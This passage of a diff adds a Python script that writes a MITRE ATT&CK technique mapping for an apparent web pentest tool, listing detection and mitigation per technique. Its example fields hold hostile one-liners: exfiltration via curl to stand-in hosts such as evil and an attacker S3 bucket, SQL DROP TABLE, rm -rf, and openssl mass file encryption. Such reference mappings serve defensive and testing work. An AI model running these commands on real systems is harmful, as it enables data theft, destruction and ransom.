+     "description": "Adversary archives data for exfiltration: tar.gz, zip, 7z. Web pentest: dump DB → tar.gz → upload to attacker's S3 via SSRF.",
+     "detection": "EDR for tar/zip invocations by web server user. Network logs for large outbound transfers.",
+     "mitigation": "Egress filtering. Block large outbound transfers from web server. Monitor for tar/zip from www-data.",
+     "related_wstg_ids": ["WSTG-INPV-13"],
+     "related_cwe": ["CWE-78"],
+     "example_uses": ["mysqldump users | gzip > /tmp/users.sql.gz", "tar czf /tmp/loot.tar.gz /var/www/uploads"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Exfiltration (3 techniques) ==========
+    {"technique_id": "T1041", "name": "Exfiltration Over C2 Channel",
+     "tactic": "Exfiltration",
+     "description": "Adversary exfiltrates data over C2 channel (HTTP, HTTPS, DNS). Web pentest: webshell reads DB, encodes data as base64, sends via HTTP POST to attacker server.",
+     "detection": "Network traffic analysis for large outbound transfers. DLP for known sensitive patterns (credit cards, SSN).",
+     "mitigation": "Egress filtering. Allow only specific outbound destinations. DLP monitoring.",
+     "related_wstg_ids": ["WSTG-INPV-13"],
+     "related_cwe": ["CWE-78"],
+     "example_uses": ["webshell: tar czf - /etc | curl -X POST -d @- http://evil/", "DNS exfiltration: encode data as subdomain of evil.com"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1048", "name": "Exfiltration Over Alternative Protocol",
+     "tactic": "Exfiltration",
+     "description": "Adversary exfiltrates over alternative protocol (DNS, ICMP, HTTPS to non-standard port). Web pentest: SSRF used to send data to attacker via GET params (?data=base64).",
+     "detection": "DNS logs for high-volume TXT queries (DNS tunneling). Network traffic analysis for non-standard ports.",
+     "mitigation": "Egress filtering. DNS rate limit per source. Block known DNS tunneling tools (Iodine, DNS2TCP).",
+     "related_wstg_ids": ["WSTG-INPV-20"],
+     "related_cwe": ["CWE-918"],
+     "example_uses": ["SSRF: GET https://target.com/fetch?url=https://evil.com/?data=base64(db_dump)", "DNS exfil: iodine tunnel"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1567", "name": "Exfiltration Over Web Service",
+     "tactic": "Exfiltration",
+     "description": "Adversary exfiltrates data via legitimate web service: Dropbox, Google Drive, Pastebin, Discord. Web pentest: upload stolen data to attacker's S3 bucket, or use legitimate cloud sync to hide exfil.",
+     "detection": "DLP for uploads to known cloud storage. Network logs for unusual volume to cloud storage providers.",
+     "mitigation": "Egress filtering. Block known file-sharing services from web servers. DLP monitoring.",
+     "related_wstg_ids": ["WSTG-INPV-13"],
+     "related_cwe": ["CWE-78"],
+     "example_uses": ["webshell: curl -F 'file=@db_dump.sql' https://attacker.s3.amazonaws.com/", "upload to Pastebin via API"],
+     "applicable_to_web_mvp": True},
+
+    # ========== Impact (3 techniques) ==========
+    {"technique_id": "T1499", "name": "Endpoint Denial of Service",
+     "tactic": "Impact",
+     "description": "Adversary causes DoS by exhausting resources: CPU, memory, disk, network. Web pentest: regex DoS (ReDoS), XML bomb (billion laughs), slowloris, large file upload.",
+     "detection": "Server monitoring for resource exhaustion. SIEM alert on traffic spikes. DDoS protection (Cloudflare, AWS Shield).",
+     "mitigation": "Use WAF + DDoS protection. Set request body size limit. Use rate limiting. Validate input length. Disable XML external entities (XXE).",
+     "related_wstg_ids": ["WSTG-INPV-14", "WSTG-INPV-17", "WSTG-BUSL-10"],
+     "related_cwe": ["CWE-400", "CWE-770", "CWE-776"],
+     "example_uses": ["ReDoS: (a+)+ on long input takes minutes to evaluate", "slowloris: send partial HTTP requests to exhaust connection pool"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1485", "name": "Data Destruction",
+     "tactic": "Impact",
+     "description": "Adversary destroys data: DROP TABLE, rm -rf, disk wipe. Web pentest: SQL injection leading to DROP TABLE, RCE leading to rm -rf /var/www. Ransomware.",
+     "detection": "Database audit log for DROP/TRUNCATE. EDR for rm -rf invocations.",
+     "mitigation": "Principle of least privilege — web app DB user should NOT have DROP permission. Backup regularly. Use immutable storage for backups.",
+     "related_wstg_ids": ["WSTG-INPV-05", "WSTG-INPV-13"],
+     "related_cwe": ["CWE-89", "CWE-78"],
+     "example_uses": ["SQLi: '; DROP TABLE users; --", "RCE: rm -rf /var/www/html"],
+     "applicable_to_web_mvp": True},
+
+    {"technique_id": "T1486", "name": "Data Encrypted for Impact",
+     "tactic": "Impact",
+     "description": "Adversary encrypts data for ransom (ransomware). Web pentest: web app finds sensitive files on disk, encrypts them with attacker's public key. Webshell-based ransomware.",
+     "detection": "EDR for mass file modifications. File integrity monitoring for unusual encryption activity.",
+     "mitigation": "Least privilege for web server user. Read-only access to critical files. Offline backups. Network segmentation.",
+     "related_wstg_ids": ["WSTG-INPV-13", "WSTG-BUSL-09"],
+     "related_cwe": ["CWE-78", "CWE-434"],
+     "example_uses": ["webshell: find /var/www -name '*.php' -exec openssl enc -aes-256-cbc -in {} -out {}.enc -k attacker_key \\;"],
+     "applicable_to_web_mvp": False},
+
+    # ========== Credential Access: Phishing via web app ==========
+    {"technique_id": "T1566", "name": "Phishing",
+     "tactic": "Initial Access",
+     "description": "Adversary sends phishing email/SMS to trick user into entering credentials on fake site. Web pentest: test for open redirect that can be abused for phishing (https://target.com/redirect?url=https://evil.com looks legitimate).",
+     "detection": "DMARC/DKIM/SPF email auth. User education. SIEM alert on open redirect patterns.",
+     "mitigation": "Validate redirect URLs against allow-list. Don't accept arbitrary URL in redirect parameters. Train users to verify URLs.",
+     "related_wstg_ids": ["WSTG-CLNT-04"],
+     "related_cwe": ["CWE-601"],
+     "example_uses": ["open redirect: https://target.com/login?next=https://evil.com/fake-login → user enters creds on evil.com"],
+     "applicable_to_web_mvp": True},
+]
+
+
+def main():
+    output = {
+        "version": "15.1",
+        "source": "https://attack.mitre.org/",
+        "last_updated": "2026-09-15",
+        "license": "Apache 2.0 (MITRE ATT&CK is open source)",
+        "scope": "Enterprise ATT&CK (subset curated for web/network pentest MVP)",
+        "tactics": [
+            {"code": "Reconnaissance",         "id": "TA0043"},
+            {"code": "Initial Access",          "id": "TA0001"},
+            {"code": "Execution",              "id": "TA0002"},
+            {"code": "Persistence",            "id": "TA0003"},
+            {"code": "Privilege Escalation",   "id": "TA0004"},
+            {"code": "Defense Evasion",        "id": "TA0005"},
+            {"code": "Credential Access",      "id": "TA0006"},
+            {"code": "Discovery",             "id": "TA0007"},
+            {"code": "Lateral Movement",       "id": "TA0008"},
+            {"code": "Collection",             "id": "TA0009"},
+            {"code": "Command and Control",    "id": "TA0011"},
+            {"code": "Exfiltration",           "id": "TA0010"},
+            {"code": "Impact",                 "id": "TA0040"},
+        ],
+        "techniques": ATTACK_TECHNIQUES,
+    }
+
+    out_path = Path("/home/nhat/VAPT-AI/data/attack_mapping.yaml")
+    out_path.parent.mkdir(parents=True, exist_ok=True)
+    with out_path.open("w", encoding="utf-8") as f:
+        yaml.dump(output, f, allow_unicode=True, default_flow_style=False, sort_keys=False, width=120)
+
+    # Stats
+    total = len(ATTACK_TECHNIQUES)
+    web_mvp = sum(1 for t in ATTACK_TECHNIQUES if t["applicable_to_web_mvp"])
+    by_tactic = {}
+    for t in ATTACK_TECHNIQUES:
+        by_tactic.setdefault(t["tactic"], 0)
+        by_tactic[t["tactic"]] += 1
+
+    print(f"Generated: {out_path}")
+    print(f"Total techniques: {total}")
+    print(f"Applicable to Web MVP: {web_mvp}")
+    print(f"Tactics represented: {len(by_tactic)}")
+    for tactic, n in sorted(by_tactic.items()):
+        print(f"  - {tactic}: {n}")
+
+
+if __name__ == "__main__":
+    main()
